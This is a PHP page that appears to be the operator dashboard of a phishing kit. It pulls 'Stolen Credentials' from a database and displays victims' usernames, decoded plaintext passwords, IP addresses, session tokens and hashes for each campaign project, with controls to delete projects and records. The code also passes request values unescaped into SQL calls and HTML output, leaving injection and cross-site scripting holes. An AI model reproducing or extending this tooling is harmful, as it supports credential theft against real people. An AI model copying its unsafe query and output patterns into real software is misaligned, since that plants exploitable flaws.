<HTML>
<HEAD>
<link rel="stylesheet" href="../main.css">
</HEAD>
<BODY>
<CENTER>
<?php

// Read Database Connection Variables
require_once '../dbconfig.php';

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if(isset($_REQUEST['deleteproject'])){

// Show Credentails for the Selected Project
$sql = "CALL RemoveProjects('".$_REQUEST['deleteproject']."');";
$result = $conn->query($sql);

}

// If the Project is Not Already Selected..
if(!isset($_REQUEST['project'])){

// Show Unique Projects (Not Including Blanks)
$sql1 = "CALL CheckProjects();";
$result1 = $conn->query($sql1);
?>

<?php
// Show Project Drop Down Selection
?>
    <h2><font color="#FFFFFF">Select Project</FONT></h2>
<FORM METHOD="POST" ACTION="<?php echo $_SERVER['PHP_SELF'];?>">
<SELECT NAME="project">

<?php
    // output data of each row
    while($row1 = $result1->fetch_assoc()) {
//$pw = $row["pass"];
echo "<option value=\"".$row1["location"]."\">".$row1["location"]."</option>";
    }

?>
</SELECT>
<INPUT TYPE="submit" value="Go!">
</FORM>
<?php
}

// If a Project is Selected Already After Posting to Self...
if(isset($_REQUEST['project'])){ $project = $_REQUEST['project'];

if(isset($_REQUEST['deleteproject'])){

$projectdelname = $_REQUEST['deleteproject'];

// Show Credentails for the Selected Project
$sql = "CALL RemoveProject('$projectdelname');";
$result = $conn->query($sql);
      
}

// Show Credentails for the Selected Project
$sql = "CALL GetRecords('$project');";
$result = $conn->query($sql);

?>
    <h2><FONT COLOR="#FFFFFF">Stolen Credentials</FONT></h2>



<FORM METHOD="POST" ACTION="<?php echo $_SERVER['PHP_SELF'];?>">
<input type="hidden" name="deleteproject" value="<?php echo $project; ?>">
<input type="submit" value="Delete Project">
</FORM>



<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH>Hash</TH><TH>Actions</TH></TR>
<?php
    // output data of each row
    while($row = $result->fetch_assoc()) {
//$pw = $row["pass"];
$inputfields = "<input type=\"hidden\" name=\"project\" value=\"".$project."\"><input type=\"hidden\" name=\"timestamp\" value=\"".$row['entered']."\">";
echo "<tr><td>".$row["username"]."</td><td>".base64_decode($row["password"])."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td><td>".$row["Token"]."</td><td>".$row["Hash"]."</td><td><form method=\"post\" action=\"".$_SERVER['PHP_SELF']."\"><input type=\"submit\" value=\"Delete\" name=\"DELETE\">".$inputfields."</td></form></tr>";
    }

printf($conn->error);

}

$conn->close();
?></TABLE>
</CENTER>
</BODY>
</HTML>
